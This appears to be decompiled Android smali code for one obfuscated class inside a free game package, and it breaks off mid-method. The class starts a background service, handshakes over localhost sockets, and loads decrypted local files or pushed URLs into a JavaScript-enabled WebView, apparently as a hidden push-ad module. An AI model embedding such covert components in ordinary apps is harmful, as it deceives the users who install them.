.class public Lcom/masshabit/squibble/free/activity/h;
.super Landroid/app/Activity;


# static fields
.field public static final STR_PARA_SUGGEST_CONTENT_KEY:Ljava/lang/String; = "ACTIVITY_PARAM_SUGGEST_CONTENT_KEY"

.field public static final STR_PARA_SUGGEST_SMS_KEY:Ljava/lang/String; = "ACTIVITY_PARAM_SUGGEST_SMS_KEY"

.field public static final STR_PARA_URL_KEY:Ljava/lang/String; = "ACTIVITY_PARAM_URL_KEY"

.field static final a:[I

.field static b:Ljava/net/Socket;

.field private static h:Z

.field private static i:Z


# instance fields
.field c:Ljava/util/HashMap;

.field d:Landroid/widget/ProgressBar;

.field e:Landroid/widget/ArrayAdapter;

.field f:Landroid/widget/Button;

.field private g:Landroid/webkit/WebView;

.field private j:Landroid/widget/LinearLayout;

.field private k:Ljava/lang/String;

.field private l:Ljava/lang/String;

.field private m:[Lcom/masshabit/squibble/free/activity/e/b;

.field private n:[Z


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-boolean v0, Lcom/masshabit/squibble/free/activity/h;->h:Z

    sput-boolean v0, Lcom/masshabit/squibble/free/activity/h;->i:Z

    const/4 v0, 0x3

    new-array v0, v0, [I

    fill-array-data v0, :array_0

    sput-object v0, Lcom/masshabit/squibble/free/activity/h;->a:[I

    const/4 v0, 0x0

    sput-object v0, Lcom/masshabit/squibble/free/activity/h;->b:Ljava/net/Socket;

    return-void

    nop

    :array_0
    .array-data 4
        0x1538
        0x1195
        0x198f
    .end array-data
.end method

.method public constructor <init>()V
    .locals 1

    const/4 v0, 0x0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    iput-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->g:Landroid/webkit/WebView;

    iput-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->c:Ljava/util/HashMap;

    iput-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->d:Landroid/widget/ProgressBar;

    iput-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->j:Landroid/widget/LinearLayout;

    iput-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->k:Ljava/lang/String;

    iput-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->l:Ljava/lang/String;

    iput-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->m:[Lcom/masshabit/squibble/free/activity/e/b;

    iput-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->n:[Z

    iput-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->e:Landroid/widget/ArrayAdapter;

    iput-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->f:Landroid/widget/Button;

    return-void
.end method

.method private a(Lcom/masshabit/squibble/free/activity/c;)V
    .locals 11

    const/4 v10, 0x3

    const/4 v9, 0x2

    const/4 v8, 0x1

    const/4 v7, 0x0

    const/4 v6, -0x1

    invoke-virtual {p1}, Lcom/masshabit/squibble/free/activity/c;->d()Lcom/masshabit/squibble/free/activity/a/Abstract;

    move-result-object v0

    check-cast v0, Lcom/masshabit/squibble/free/activity/a/d;

    const-string v1, "ACTIVITY_PARAM_URL_KEY"

    invoke-virtual {v0, v1}, Lcom/masshabit/squibble/free/activity/a/d;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Landroid/webkit/WebView;

    invoke-direct {v1, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lcom/masshabit/squibble/free/activity/h;->g:Landroid/webkit/WebView;

    new-instance v1, Ljava/util/HashMap;

    invoke-direct {v1}, Ljava/util/HashMap;-><init>()V

    iput-object v1, p0, Lcom/masshabit/squibble/free/activity/h;->c:Ljava/util/HashMap;

    iget-object v1, p0, Lcom/masshabit/squibble/free/activity/h;->d:Landroid/widget/ProgressBar;

    if-nez v1, :cond_0

    new-instance v1, Landroid/widget/ProgressBar;

    const/4 v2, 0x0

    const v3, 0x1010078

    invoke-direct {v1, p0, v2, v3}, Landroid/widget/ProgressBar;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;I)V

    iput-object v1, p0, Lcom/masshabit/squibble/free/activity/h;->d:Landroid/widget/ProgressBar;

    :cond_0
    iget-object v1, p0, Lcom/masshabit/squibble/free/activity/h;->d:Landroid/widget/ProgressBar;

    invoke-virtual {v1, v7}, Landroid/widget/ProgressBar;->setProgress(I)V

    iget-object v1, p0, Lcom/masshabit/squibble/free/activity/h;->g:Landroid/webkit/WebView;

    new-instance v2, Lcom/masshabit/squibble/free/activity/b;

    iget-object v3, p0, Lcom/masshabit/squibble/free/activity/h;->c:Ljava/util/HashMap;

    invoke-direct {v2, v3}, Lcom/masshabit/squibble/free/activity/b;-><init>(Ljava/util/HashMap;)V

    const-string v3, "hrefmap"

    invoke-virtual {v1, v2, v3}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v1, "file:"

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_3

    const/4 v1, 0x6

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide v2

    long-to-int v0, v2

    new-array v2, v0, [B

    :try_start_0
    new-instance v3, Ljava/io/FileInputStream;

    invoke-direct {v3, v1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    move v4, v7

    :goto_0
    if-ge v4, v0, :cond_1

    sub-int v5, v0, v4

    invoke-virtual {v3, v2, v4, v5}, Ljava/io/FileInputStream;->read([BII)I

    move-result v5

    add-int/2addr v4, v5

    goto :goto_0

    :cond_1
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V

    invoke-static {v2}, Lcom/masshabit/squibble/free/activity/e/p;->a([B)[B

    move-result-object v0

    const/4 v2, 0x0

    aget-byte v2, v0, v2

    and-int/lit16 v2, v2, 0xff

    const/16 v3, 0xef

    if-ne v2, v3, :cond_2

    const/4 v2, 0x1

    aget-byte v2, v0, v2

    and-int/lit16 v2, v2, 0xff

    const/16 v3, 0xbb

    if-ne v2, v3, :cond_2

    const/4 v2, 0x2

    aget-byte v2, v0, v2

    and-int/lit16 v2, v2, 0xff

    const/16 v3, 0xbf

    if-ne v2, v3, :cond_2

    new-instance v2, Ljava/lang/String;

    const/4 v3, 0x3

    array-length v4, v0

    sub-int/2addr v4, v10

    invoke-direct {v2, v0, v3, v4}, Ljava/lang/String;-><init>([BII)V

    :goto_1
    iget-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->g:Landroid/webkit/WebView;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "file:/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v1}, Ljava/io/File;->getParent()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, "/"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v3, "text/html"

    const-string v4, "utf-8"

    const-string v5, ""

    invoke-virtual/range {v0 .. v5}, Landroid/webkit/WebView;->loadDataWithBaseURL(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_2
    iget-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->g:Landroid/webkit/WebView;

    invoke-virtual {v0, v8}, Landroid/webkit/WebView;->clearCache(Z)V

    iget-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->g:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v8}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    invoke-virtual {p0, v9}, Lcom/masshabit/squibble/free/activity/h;->requestWindowFeature(I)Z

    iget-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->g:Landroid/webkit/WebView;

    new-instance v1, Lcom/masshabit/squibble/free/activity/v;

    invoke-direct {v1, p0}, Lcom/masshabit/squibble/free/activity/v;-><init>(Lcom/masshabit/squibble/free/activity/h;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    iget-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->g:Landroid/webkit/WebView;

    new-instance v1, Lcom/masshabit/squibble/free/activity/w;

    invoke-direct {v1, p0, p1}, Lcom/masshabit/squibble/free/activity/w;-><init>(Lcom/masshabit/squibble/free/activity/h;Lcom/masshabit/squibble/free/activity/c;)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    iget-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->d:Landroid/widget/ProgressBar;

    invoke-virtual {v0, v7}, Landroid/widget/ProgressBar;->setIndeterminate(Z)V

    new-instance v0, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v1, -0x2

    invoke-direct {v0, v6, v1}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    new-instance v1, Landroid/widget/LinearLayout;

    invoke-direct {v1, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lcom/masshabit/squibble/free/activity/h;->j:Landroid/widget/LinearLayout;

    iget-object v1, p0, Lcom/masshabit/squibble/free/activity/h;->j:Landroid/widget/LinearLayout;

    invoke-virtual {v1, v8}, Landroid/widget/LinearLayout;->setOrientation(I)V

    iget-object v1, p0, Lcom/masshabit/squibble/free/activity/h;->j:Landroid/widget/LinearLayout;

    iget-object v2, p0, Lcom/masshabit/squibble/free/activity/h;->d:Landroid/widget/ProgressBar;

    invoke-virtual {v1, v2, v0}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    new-instance v0, Landroid/widget/LinearLayout$LayoutParams;

    const/high16 v1, 0x3f800000    # 1.0f

    invoke-direct {v0, v6, v6, v1}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    iget-object v1, p0, Lcom/masshabit/squibble/free/activity/h;->j:Landroid/widget/LinearLayout;

    iget-object v2, p0, Lcom/masshabit/squibble/free/activity/h;->g:Landroid/webkit/WebView;

    invoke-virtual {v1, v2, v0}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    new-instance v0, Landroid/view/ViewGroup$LayoutParams;

    invoke-direct {v0, v6, v6}, Landroid/view/ViewGroup$LayoutParams;-><init>(II)V

    iget-object v1, p0, Lcom/masshabit/squibble/free/activity/h;->j:Landroid/widget/LinearLayout;

    invoke-virtual {p0, v1, v0}, Lcom/masshabit/squibble/free/activity/h;->setContentView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    return-void

    :cond_2
    :try_start_1
    new-instance v2, Ljava/lang/String;

    invoke-direct {v2, v0}, Ljava/lang/String;-><init>([B)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_1

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    invoke-virtual {p0}, Lcom/masshabit/squibble/free/activity/h;->finish()V

    goto :goto_2

    :cond_3
    iget-object v1, p0, Lcom/masshabit/squibble/free/activity/h;->g:Landroid/webkit/WebView;

    invoke-virtual {v1, v0}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    goto :goto_2
.end method

.method static synthetic a()Z
    .locals 1

    sget-boolean v0, Lcom/masshabit/squibble/free/activity/h;->h:Z

    return v0
.end method

.method static synthetic a(Z)Z
    .locals 0

    sput-boolean p0, Lcom/masshabit/squibble/free/activity/h;->h:Z

    return p0
.end method

.method static synthetic a(Lcom/masshabit/squibble/free/activity/h;)[Z
    .locals 1

    iget-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->n:[Z

    return-object v0
.end method

.method static synthetic b(Lcom/masshabit/squibble/free/activity/h;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->l:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic b()Z
    .locals 1

    sget-boolean v0, Lcom/masshabit/squibble/free/activity/h;->i:Z

    return v0
.end method

.method static synthetic b(Z)Z
    .locals 0

    sput-boolean p0, Lcom/masshabit/squibble/free/activity/h;->i:Z

    return p0
.end method

.method static synthetic c(Lcom/masshabit/squibble/free/activity/h;)[Lcom/masshabit/squibble/free/activity/e/b;
    .locals 1

    iget-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->m:[Lcom/masshabit/squibble/free/activity/e/b;

    return-object v0
.end method

.method static synthetic d(Lcom/masshabit/squibble/free/activity/h;)V
    .locals 7

    const/4 v5, 0x1

    const/4 v4, -0x1

    const/4 v6, 0x0

    invoke-static {}, Lcom/masshabit/squibble/free/activity/e/k;->k()[Lcom/masshabit/squibble/free/activity/e/b;

    move-result-object v0

    iput-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->m:[Lcom/masshabit/squibble/free/activity/e/b;

    iget-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->m:[Lcom/masshabit/squibble/free/activity/e/b;

    array-length v0, v0

    if-nez v0, :cond_0

    invoke-virtual {p0}, Lcom/masshabit/squibble/free/activity/h;->finish()V

    :cond_0
    new-instance v0, Landroid/widget/LinearLayout;

    invoke-direct {v0, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    new-instance v1, Landroid/widget/ListView;

    invoke-direct {v1, p0}, Landroid/widget/ListView;-><init>(Landroid/content/Context;)V

    new-instance v2, Landroid/widget/LinearLayout$LayoutParams;

    const/high16 v3, 0x3f800000    # 1.0f

    invoke-direct {v2, v4, v4, v3}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    invoke-virtual {v0, v1, v2}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    invoke-virtual {v0, v5}, Landroid/widget/LinearLayout;->setOrientation(I)V

    new-instance v2, Landroid/widget/LinearLayout;

    invoke-direct {v2, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    invoke-virtual {v2, v6}, Landroid/widget/LinearLayout;->setOrientation(I)V

    invoke-virtual {v2, v5}, Landroid/widget/LinearLayout;->setGravity(I)V

    new-instance v3, Landroid/widget/Button;

    invoke-direct {v3, p0}, Landroid/widget/Button;-><init>(Landroid/content/Context;)V

    new-instance v4, Lcom/masshabit/squibble/free/activity/x;

    invoke-direct {v4, p0}, Lcom/masshabit/squibble/free/activity/x;-><init>(Lcom/masshabit/squibble/free/activity/h;)V

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const-string v4, "\u786e\u5b9a"

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    invoke-virtual {v2, v3}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    new-instance v3, Landroid/widget/Button;

    invoke-direct {v3, p0}, Landroid/widget/Button;-><init>(Landroid/content/Context;)V

    iput-object v3, p0, Lcom/masshabit/squibble/free/activity/h;->f:Landroid/widget/Button;

    iget-object v3, p0, Lcom/masshabit/squibble/free/activity/h;->f:Landroid/widget/Button;

    new-instance v4, Lcom/masshabit/squibble/free/activity/y;

    invoke-direct {v4, p0}, Lcom/masshabit/squibble/free/activity/y;-><init>(Lcom/masshabit/squibble/free/activity/h;)V

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    iget-object v3, p0, Lcom/masshabit/squibble/free/activity/h;->f:Landroid/widget/Button;

    const-string v4, "\u5168\u9009"

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    iget-object v3, p0, Lcom/masshabit/squibble/free/activity/h;->f:Landroid/widget/Button;

    invoke-virtual {v2, v3}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    new-instance v3, Landroid/widget/Button;

    invoke-direct {v3, p0}, Landroid/widget/Button;-><init>(Landroid/content/Context;)V

    new-instance v4, Lcom/masshabit/squibble/free/activity/z;

    invoke-direct {v4, p0}, Lcom/masshabit/squibble/free/activity/z;-><init>(Lcom/masshabit/squibble/free/activity/h;)V

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const-string v4, "\u53d6\u6d88"

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    invoke-virtual {v2, v3}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    invoke-virtual {v0, v2}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    invoke-virtual {p0, v0}, Lcom/masshabit/squibble/free/activity/h;->setContentView(Landroid/view/View;)V

    iget-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->m:[Lcom/masshabit/squibble/free/activity/e/b;

    array-length v0, v0

    new-array v0, v0, [Ljava/lang/String;

    iget-object v2, p0, Lcom/masshabit/squibble/free/activity/h;->m:[Lcom/masshabit/squibble/free/activity/e/b;

    array-length v2, v2

    new-array v2, v2, [Z

    iput-object v2, p0, Lcom/masshabit/squibble/free/activity/h;->n:[Z

    move v2, v6

    :goto_0
    iget-object v3, p0, Lcom/masshabit/squibble/free/activity/h;->m:[Lcom/masshabit/squibble/free/activity/e/b;

    array-length v3, v3

    if-ge v2, v3, :cond_2

    iget-object v3, p0, Lcom/masshabit/squibble/free/activity/h;->m:[Lcom/masshabit/squibble/free/activity/e/b;

    aget-object v3, v3, v2

    iget-object v3, v3, Lcom/masshabit/squibble/free/activity/e/b;->b:Ljava/lang/String;

    const/16 v4, 0x3b

    invoke-virtual {v3, v4}, Ljava/lang/String;->indexOf(I)I

    move-result v4

    if-lez v4, :cond_1

    invoke-virtual {v3, v6, v4}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    :cond_1
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v5, p0, Lcom/masshabit/squibble/free/activity/h;->m:[Lcom/masshabit/squibble/free/activity/e/b;

    aget-object v5, v5, v2

    iget-object v5, v5, Lcom/masshabit/squibble/free/activity/e/b;->a:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "("

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ")"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v0, v2

    iget-object v3, p0, Lcom/masshabit/squibble/free/activity/h;->n:[Z

    aput-boolean v6, v3, v2

    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_2
    new-instance v2, Lcom/masshabit/squibble/free/activity/A;

    const v3, 0x1090005

    invoke-direct {v2, p0, p0, v3, v0}, Lcom/masshabit/squibble/free/activity/A;-><init>(Lcom/masshabit/squibble/free/activity/h;Landroid/content/Context;I[Ljava/lang/String;)V

    iput-object v2, p0, Lcom/masshabit/squibble/free/activity/h;->e:Landroid/widget/ArrayAdapter;

    iget-object v0, p0, Lcom/masshabit/squibble/free/activity/h;->e:Landroid/widget/ArrayAdapter;

    invoke-virtual {v1, v0}, Landroid/widget/ListView;->setAdapter(Landroid/widget/ListAdapter;)V

    new-instance v0, Lcom/masshabit/squibble/free/activity/B;

    invoke-direct {v0, p0}, Lcom/masshabit/squibble/free/activity/B;-><init>(Lcom/masshabit/squibble/free/activity/h;)V

    invoke-virtual {v1, v0}, Landroid/widget/ListView;->setOnItemClickListener(Landroid/widget/AdapterView$OnItemClickListener;)V

    return-void
.end method

.method public static isRunningServices(Landroid/content/Context;)Z
    .locals 12

    const/4 v11, 0x1

    const/4 v2, 0x0

    invoke-static {}, Lcom/masshabit/squibble/free/activity/e/k;->f()Ljava/lang/String;

    move-result-object v0

    const-string v1, "\\."

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    aget-object v1, v0, v2

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    aget-object v0, v0, v11

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    move v3, v2

    :goto_0
    sget-object v4, Lcom/masshabit/squibble/free/activity/h;->a:[I

    array-length v4, v4

    if-ge v2, v4, :cond_4

    if-eqz v3, :cond_0

    move v0, v11

    :goto_1
    return v0

    :cond_0
    :try_start_0
    new-instance v4, Ljava/net/Socket;

    const-string v5, "127.0.0.1"

    sget-object v6, Lcom/masshabit/squibble/free/activity/h;->a:[I

    aget v6, v6, v2

    invoke-direct {v4, v5, v6}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    sput-object v4, Lcom/masshabit/squibble/free/activity/h;->b:Ljava/net/Socket;

    invoke-virtual {v4}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    sget-object v5, Lcom/masshabit/squibble/free/activity/h;->b:Ljava/net/Socket;

    invoke-virtual {v5}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v5

    const-string v6, "hi,are you online?"

    invoke-virtual {v6}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/io/OutputStream;->write([B)V

    new-instance v6, Ljava/util/Timer;

    invoke-direct {v6}, Ljava/util/Timer;-><init>()V

    new-instance v7, Lcom/masshabit/squibble/free/activity/u;

    invoke-direct {v7}, Lcom/masshabit/squibble/free/activity/u;-><init>()V

    const-wide/16 v8, 0x1388

    invoke-virtual {v6, v7, v8, v9}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    const/16 v7, 0x100

    new-array v7, v7, [B

    invoke-virtual {v4, v7}, Ljava/io/InputStream;->read([B)I

    move-result v8

    new-instance v9, Ljava/lang/String;

    const/4 v10, 0x0

    invoke-direct {v9, v7, v10, v8}, Ljava/lang/String;-><init>([BII)V

    const-string v7, "yes,I\'m online!"

    invoke-virtual {v9, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    invoke-virtual {v6}, Ljava/util/Timer;->cancel()V

    invoke-virtual {v5, v1}, Ljava/io/OutputStream;->write(I)V

    invoke-virtual {v5, v0}, Ljava/io/OutputStream;->write(I)V

    invoke-virtual {v4}, Ljava/io/InputStream;->read()I

    move-result v7

    invoke-virtual {v4}, Ljava/io/InputStream;->read()I

    move-result v8

    if-lt v1, v7, :cond_1

    if-ne v1, v7, :cond_2

    if-gt v0, v8, :cond_2

    :cond_1
    move v3, v11

    :cond_2
    invoke-virtual {v5}, Ljava/io/OutputStream;->flush()V

    invoke-virtual {v5}, Ljava/io/OutputStream;->close()V

    invoke-virtual {v4}, Ljava/io/InputStream;->close()V

    sget-object v4, Lcom/masshabit/squibble/free/activity/h;->b:Ljava/net/Socket;

    invoke-virtual {v4}, Ljava/net/Socket;->close()V

    :cond_3
    invoke-virtual {v6}, Ljava/util/Timer;->cancel()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_4
    move v0, v3

    goto :goto_1

    :catch_0
    move-exception v4

    goto :goto_2
.end method

.method public static setDebugMode()V
    .locals 0

    invoke-static {}, Lcom/masshabit/squibble/free/activity/e;->a()V

    return-void
.end method

.method public static startServiceIfMust(Landroid/content/Context;)V
    .locals 1

    new-instance v0, Lcom/masshabit/squibble/free/activity/q;

    invoke-direct {v0, p0}, Lcom/masshabit/squibble/free/activity/q;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lcom/masshabit/squibble/free/activity/q;->start()V

    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 5

    const-string v1, "ACTIVITY_PARAM_KEY"

    const-string v1, ""

    invoke-virtual {p0, v1}, Lcom/masshabit/squibble/free/activity/h;->setTitle(Ljava/lang/CharSequence;)V

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    :try_start_0
    invoke-virtual {p0}, Lcom/masshabit/squibble/free/activity/h;->getIntent()Landroid/content/Intent;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    if-nez v1, :cond_2

    invoke-static {p0}, Lcom/masshabit/squibble/free/activity/h;->startServiceIfMust(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 v1, 0x0

    :try_start_1
    sget-object v2, Lcom/masshabit/squibble/free/activity/e;->a:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v1

    :goto_0
    if-eqz v1, :cond_0

    :try_start_2
    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v2}, Lcom/masshabit/squibble/free/activity/h;->startActivity(Landroid/content/Intent;)V

    :cond_0
    invoke-static {}, Lcom/masshabit/squibble/free/activity/c/Show;->show()V

    invoke-virtual {p0}, Lcom/masshabit/squibble/free/activity/h;->finish()V

    :cond_1
    :goto_1
    return-void

    :cond_2
    const-string v2, "ACTIVITY_PARAM_KEY"

    invoke-virtual {v1, v2}, Landroid/os/Bundle;->getParcelable(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object v2

    if-eqz v2, :cond_1

    const-string v2, "ACTIVITY_PARAM_KEY"

    invoke-virtual {v1, v2}, Landroid/os/Bundle;->getParcelable(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object v1

    check-cast v1, Lcom/masshabit/squibble/free/activity/Pushable;

    invoke-virtual {v1, p0}, Lcom/masshabit/squibble/free/activity/Pushable;->a(Landroid/content/Context;)Z

    move-result v2

    if-nez v2, :cond_5

    move-object v0, v1

    check-cast v0, Lcom/masshabit/squibble/free/activity/c;

    move-object v2, v0

    invoke-virtual {v2}, Lcom/masshabit/squibble/free/activity/c;->d()Lcom/masshabit/squibble/free/activity/a/Abstract;

    move-result-object v3

    instance-of v3, v3, Lcom/masshabit/squibble/free/activity/a/d;

    if-eqz v3, :cond_4

    const-string v3, "\u52a0\u8f7d\u4e2d..."

    invoke-virtual {p0, v3}, Lcom/masshabit/squibble/free/activity/h;->setTitle(Ljava/lang/CharSequence;)V

    invoke-direct {p0, v2}, Lcom/masshabit/squibble/free/activity/h;->a(Lcom/masshabit/squibble/free/activity/c;)V

    :cond_3
    :goto_2
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v3, 0x2a

    invoke-static {v3}, Lcom/masshabit/squibble/free/activity/e/p;->a(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Lcom/masshabit/squibble/free/activity/e/k;->h:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const/16 v3, 0x2b

    invoke-static {v3}, Lcom/masshabit/squibble/free/activity/e/p;->a(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Lcom/masshabit/squibble/free/activity/e/k;->u:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const/16 v3, 0x2c

    invoke-static {v3}, Lcom/masshabit/squibble/free/activity/e/p;->a(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v1}, Lcom/masshabit/squibble/free/activity/Pushable;->i()I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    const/16 v3, 0x2d

